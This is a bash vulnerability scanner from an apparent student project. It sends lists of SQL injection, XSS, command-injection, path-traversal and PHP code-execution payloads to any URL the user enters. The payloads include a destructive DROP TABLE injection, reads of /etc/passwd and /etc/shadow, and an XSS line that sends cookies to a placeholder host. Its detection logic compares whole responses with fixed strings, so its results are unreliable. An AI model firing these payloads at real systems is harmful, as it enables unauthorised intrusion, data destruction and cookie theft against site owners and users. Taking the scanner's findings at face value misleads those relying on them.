#!/bin/bash

echo "DSS PROJECT 2024 | MADE BY: KHUSH NADPARA, ATHARVA DESHPANDE & VARISTHA  PATNI|"

# Initialize
sql_injection_vulnerability_found=0
xss_vulnerability_found=0
command_injection_vulnerability_found=0
path_traversal_vulnerability_found=0
remote_code_execution_vulnerability_found=0

# Functions
#sql injection
check_sql_injection() {
    local url="$1"
    
    echo "Checking for SQL Injection vulnerabilities..."
    
    # Payloads for sql
    local payloads=(
        "'OR 1=1--'"
        "'"
        "1'"
        "admin'"
        "123'"
        "'; DROP TABLE users;--"
        "'UNION SELECT * FROM users;--"
        "'AND 1=2 UNION SELECT * FROM information_schema.tables;--"
        "'OR '1'='1'"
        "'OR '1'='1' --"
        "'OR '1'='1' #"
        "'OR '1'='1'/*"
        "'OR 'x'='x'"
        "'OR 1=1--"
        "'OR 'x'='x' --"
        "'OR 'x'='x' #"
        "'OR 'x'='x'/*"
        "'UNION SELECT null, null, null--"
        "'UNION SELECT null, null, user()--"
        "'NION SELECT null, null, database()--"
        "'UNION SELECT null, null, version()--"
        "'UNION SELECT null, null, table_name FROM information_schema.tables--"
        "'i'='i'"
        "1=1"
        "0=0"
        "' OR 'x'='x' --"
    )

    local vulnerability_found=false

    for payload in "${payloads[@]}"; do
        local response=$(curl -s "$url?id=$payload")
        if [[ $response == "Error" ]]; then
            echo "Potential SQL Injection vulnerability found: $url?id=$payload"
            vulnerability_found=true
            ((sql_injection_vulnerability_found++))  
        fi
    done

    if ! $vulnerability_found; then
        echo "Vulnerability is not found"
    fi
}

# xss
#function to calculate xss
check_xss() {
    local url="$1"
    
    echo "Checking for Cross-Site Scripting (XSS) vulnerabilities..."
    
    # Payloads for XSS
    local payloads=(
        "<script>alert('XSS')</script>"
        "<img src=\"javascript:alert('XSS')\">"
        "<svg/onload=alert('XSS')>"
        "<svg><script>alert('XSS')</script></svg>"
        "<img src=x onerror=alert('XSS')>"
        "<img src=\"x\" onerror=\"alert('XSS')\">"
        "<iframe src=\"javascript:alert('XSS')\"></iframe>"
        "<a href=\"javascript:alert('XSS')\">Click me</a>"
        "<body onload=alert('XSS')>"
        "<input type=\"text\" value=\"<script>alert('XSS')</script>\">"
        "<script>alert(String.fromCharCode(88,83,83))</script>"
        "<script>alert(String.fromCharCode(88,83,83))</script>"
        "<svg onload=\"eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))\"></svg>"
        "<img src=1 href=1 onerror=alert('XSS')>"
        "<img src=1 href=1 onerror=alert(1)>"
        "<img src=1 href=1 onerror=alert(String.fromCharCode(88,83,83))>"
        "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>"
        "<img src=1 href=1 onerror=alert(document.cookie)>"
        "<svg/onload='fetch(\"https://yourdomain.com/collect?cookie=\"+document.cookie)'>"
    )

    local vulnerability_found=false

    for payload in "${payloads[@]}"; do
        local response=$(curl -s "$url?input=$payload")
        if [[ $response == "$payload" ]]; then
            echo "Potential XSS vulnerability found: $url?input=$payload"
            vulnerability_found=true
            ((xss_vulnerability_found++))  
        fi
    done

    if ! $vulnerability_found; then
        echo "Vulnerability is not found"
    fi
}

# Function for os commands inection
check_command_injection() {
    local url="$1"
    
    echo "Checking for Command Injection vulnerabilities..."
    
    # Payloads for  os Command Injection
    local payloads=(
        " && ls "
        " | ls "
        " $(ls) "
        " && cat /etc/passwd "
        " | cat /etc/passwd "
        " $(cat /etc/passwd) "
        " && id "
        " | id "
        " $(id) "
        " && uname -a "
        " | uname -a "
        " $(uname -a) "
    )

    local vulnerability_found=false

    for payload in "${payloads[@]}"; do
        local response=$(curl -s "$url?param=$payload")
        if [[ $response == "Directory listing" ]]; then
            echo "Potential Command Injection vulnerability found: $url?param=$payload"
            vulnerability_found=true
            ((command_injection_vulnerability_found++)) 
        fi
    done

    if ! $vulnerability_found; then
        echo "Vulnerability is not found"
    fi
}

# Function  for Path Traversal vulnerability
check_path_traversal() {
    local url="$1"
    
    echo "Checking for Path Traversal vulnerabilities..."
    
    # Payloads for Path Traversal
    local payloads=(
        " ../../../../etc/passwd "
        " ../../../../../../etc/passwd "
        " ../../../../../../etc/shadow "
        " ../../../../../../etc/hosts "
        " ../../../../../../etc/hostname "
        " ../../../../../../etc/issue "
        " ../../../../../../proc/self/environ "
        " ../../../../../../proc/version "
        " ../../../../../../proc/cmdline "
        " ../../../../../../proc/mounts "
        " ../../../../../../proc/net/dev "
        " ../../../../../../proc/net/tcp "
        " ../../../../../../proc/net/udp "
        " ../../../../../../proc/net/raw "
        " ../../../../../../proc/sys/kernel/version "
        " ../../../../../../proc/sys/kernel/osrelease "
        " ../../../../../../proc/sys/kernel/hostname "
        " ../../../../../../proc/sys/kernel/ostype "
        " ../../../../../../proc/sys/kernel/ostype "
        " ../../../../../../proc/sys/kernel/hostname "
    )

    local vulnerability_found=false

    for payload in "${payloads[@]}"; do
        local response=$(curl -s "$url?file=$payload")
        if [[ $response == "root" ]]; then
            echo "Potential Path Traversal vulnerability found: $url?file=$payload"
            vulnerability_found=true
            ((path_traversal_vulnerability_found++))  
        fi
    done

    if ! $vulnerability_found; then
        echo "Vulnerability is not found"
    fi
}

# Function for Remote Code Execution vulnerability
check_remote_code_execution() {
    local url="$1"
    
    echo "Checking for Remote Code Execution vulnerabilities..."
    
    # Payloads for Remote Code Execution
    local payloads=(
        " <?php system('ls'); ?> "
        " <?php system('cat /etc/passwd'); ?> "
        " <?php system('id'); ?> "
        " <?php system('uname -a'); ?> "
        " <?php system('whoami'); ?> "
        " <?php system('netstat -an'); ?> "
        " <?php system('ps aux'); ?> "
        " <?php system('ifconfig'); ?> "
    )

    local vulnerability_found=false

    for payload in "${payloads[@]}"; do
        local response=$(curl -s -d "$payload" "$url")
        if [[ $response == "root" ]]; then
            echo "Potential Remote Code Execution vulnerability found: $url with payload $payload"
            vulnerability_found=true
            ((remote_code_execution_vulnerability_found++))  
        fi
    done

    if ! $vulnerability_found; then
        echo "Vulnerability is not found"
    fi
}

# Main
main() {
    # inputs and utilities
    read -p "Enter the URL to scan: " target_url
    
    # Calling all functions
    check_sql_injection "$target_url"
    check_xss "$target_url"
    check_command_injection "$target_url"
    check_path_traversal "$target_url"
    check_remote_code_execution "$target_url"
    
    # stats
    total_vulnerabilities_found=$((sql_injection_vulnerability_found + xss_vulnerability_found + command_injection_vulnerability_found + path_traversal_vulnerability_found + remote_code_execution_vulnerability_found))

    echo "Total vulnerabilities found:" $total_vulnerabilities_found 
    echo "Thank You for using this Project"
}

main